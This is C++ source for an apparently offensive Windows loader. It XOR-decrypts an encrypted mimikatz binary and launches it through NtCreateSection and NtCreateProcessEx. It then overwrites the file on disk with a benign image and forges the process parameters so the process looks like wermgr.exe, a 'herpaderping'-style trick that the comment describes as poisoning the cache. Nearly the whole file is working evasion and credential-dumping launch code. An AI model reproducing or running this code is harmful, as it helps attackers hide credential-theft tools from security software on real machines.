/*

Written On Q3 2022
This will decrypt encrypted mimikatz.exe named "asdf.exe", run it and rewrite file on disk to winlogon.exe poisoning the cache.

*/

#include <iostream>
#include <userenv.h>
#include <fstream>
#include "structs.h"

using namespace std;

#pragma comment(lib, "userenv")
#pragma comment(lib, "ntdll")

char eyk[] = "qazws"; // that's the key of the provided mimikatz encrypted

char enc[1561856];
char neww[sizeof enc];

#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

int main(int argc, char* argv[]) {


	_NtCreateSection NtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateSection");
	_NtCreateProcessEx NtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateProcessEx");
	_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandle(L"ntdll"), "NtCreateThreadEx");
	_RtlCreateProcessParametersEx RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlCreateProcessParametersEx");
	NTSTATUS status;

	HANDLE sectHandle, hFile, hProc = NULL;
	int j = 0;
	DWORD Old;
	int bytes = 1561856;
	char* data = (char*)malloc(bytes);

	ifstream in("asdf.exe", ios::in | ios::binary);
	in.read(data, sizeof(enc));

	SIZE_T size = { sizeof(enc) };

	for (int i = 0; i < sizeof enc; i++) {
		if (j == sizeof eyk - 1) j = 0;

		neww[i] = data[i] ^ eyk[j];
		j++;
	}

	in.close();


	DWORD Oldd;
	char* dataa;
	int bytess = 1561856;
	dataa = (char*)malloc(bytess);

	ifstream inn("winload.exe", ios::in | ios::binary);
	inn.read(dataa, 1561856);

	inn.close();

	hFile = CreateFile(L".\\asdf.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hFile) {
		printf("hFile error: %d\n", GetLastError());
		return -1;
	}
	
	
	fstream out("asdf.exe", ios::in | ios::binary | ios::out);
	out.write(neww, 1561856);
	out.close();
	
	//getchar();
	status = NtCreateSection(&sectHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
	if (!NT_SUCCESS(status)) {
		printf("createsection error\n");
		return -1;
	}
	
	status = NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL, (HANDLE)-1, HANDLE_FLAG_INHERIT, sectHandle, NULL, NULL, 0);
	if (!NT_SUCCESS(status)) {
		printf("createprocess error: %d\n", GetLastError());
		return -1;
	}
	
	if (!WriteFile(hFile, dataa, 1561856, NULL, 0)) {
		printf("write error: %d\n", GetLastError());
		return -1;
	}
	free(dataa);

	CloseHandle(hFile);

	HANDLE th = NULL;
	PROCESS_BASIC_INFORMATION pbi;

	NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

	PPEEB rPeb = (PPEEB)pbi.PebBaseAddress;
	printf("PEB: %p\n", rPeb);

	PVOID* imageBase = &rPeb->ImageBaseAddress;
	PVOID addr = NULL;
	ReadProcessMemory(hProc, imageBase, &addr, 8, NULL);
	printf("ImageBase: %p\n", addr);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;

	LONG e_lfanew;
	ReadProcessMemory(hProc, (char*)dos + offsetof(IMAGE_DOS_HEADER, e_lfanew), &e_lfanew, sizeof(LONG), NULL);

	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((DWORD_PTR)addr + e_lfanew);

	DWORD addrOfEntry;
	ReadProcessMemory(hProc, (char*)nt + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint), &addrOfEntry, sizeof(DWORD), NULL);

	PVOID entry = (PVOID)((DWORD_PTR)dos + addrOfEntry);
	printf("entry: %p\n", entry);


	UNICODE_STRING ustr;
	//RtlInitUnicodeString(&ustr, L"\\??\\C:\\Windows\\System32\\wermgr.exe");
	RtlInitUnicodeString(&ustr, L"C:\\Windows\\System32\\wermgr.exe");

	wchar_t wzDirPath[MAX_PATH] = { 0 };
	GetCurrentDirectoryW(MAX_PATH, wzDirPath);

	UNICODE_STRING uCurrentDir = { 0 };
	//RtlInitUnicodeString(&uCurrentDir, wzDirPath);
	RtlInitUnicodeString(&uCurrentDir, L"C:\\Windows\\System32");

	UNICODE_STRING uDllDir = { 0 };
	RtlInitUnicodeString(&uDllDir, L"C:\\Windows\\System32");

	UNICODE_STRING uWindowName = { 0 };
	RtlInitUnicodeString(&uWindowName, L"herpa");

	LPVOID lpEnv;

	CreateEnvironmentBlock(&lpEnv, NULL, TRUE);

	PRTTL_USER_PROCESS_PARAMETERS param;

	RtlCreateProcessParametersEx(&param, (PUNICODE_STRING)&ustr, (PUNICODE_STRING)&uDllDir,
		(PUNICODE_STRING)&uCurrentDir,
		(PUNICODE_STRING)&ustr,
		lpEnv,
		(PUNICODE_STRING)&uWindowName,
		NULL,
		NULL,
		NULL,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);


	PRTTL_USER_PROCESS_PARAMETERS* rParam = &rPeb->ProcessParameters;
	
	if (!WriteProcessMemory(hProc, rParam, param, sizeof(param), NULL)) {
		printf("WPM ERROR: %d\n", GetLastError());
	}

	// write to process
	PVOID buffer = param;
	printf("buffer: %p\n", buffer);
	printf("param: %p\n", param);
	printf("length: %d\n", param->Length);
	printf("envsize: %d\n", param->EnvironmentSize);

	if (VirtualAllocEx(hProc, buffer, param->Length * 20, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
		if (!WriteProcessMemory(hProc, (LPVOID)param, (LPVOID)param, param->Length, NULL)) {
			printf("Writing RemoteProcessParams failed %d\n", GetLastError());
			return -1;
		}

		printf("param env: %p\n", param->Environment);
		if (param->Environment) {
			if (!WriteProcessMemory(hProc, param->Environment, param->Environment, param->EnvironmentSize, NULL)) {
				printf("Writing environment failed %d", GetLastError());
				getchar();

			}
		}
	}

	// could not copy the continuous space, try to fill it as separate chunks:
	if (!WriteProcessMemory(hProc, (LPVOID)param, (LPVOID)param, param->Length, NULL)) {
		printf("Writing RemoteProcessParams failed %d\n", GetLastError());
		//getchar();
	}
	if (param->Environment) {
		if (!VirtualAllocEx(hProc, (LPVOID)param->Environment, param->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
			printf("Allocating environment failed %d\n", GetLastError());
			//getchar();
		}
		if (!WriteProcessMemory(hProc, (LPVOID)param->Environment, (LPVOID)param->Environment, param->EnvironmentSize, NULL)) {
			printf("Writing environment failed %d\n", GetLastError());
			//getchar();
		}
	}

	// write to PEB
	if (!WriteProcessMemory(hProc, rParam, &param, sizeof(PVOID), NULL)) {
		printf("Failed - Cannot update Params! %d\n", GetLastError());
		return FALSE;
	}

	status = NtCreateThreadEx(&th, THREAD_ALL_ACCESS, NULL, hProc, entry, 0, FALSE, NULL, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		printf("createthread error\n");
		return -1;
	}

	printf("The cache will be poisoned until this program is terminated\n");

	getchar();


}
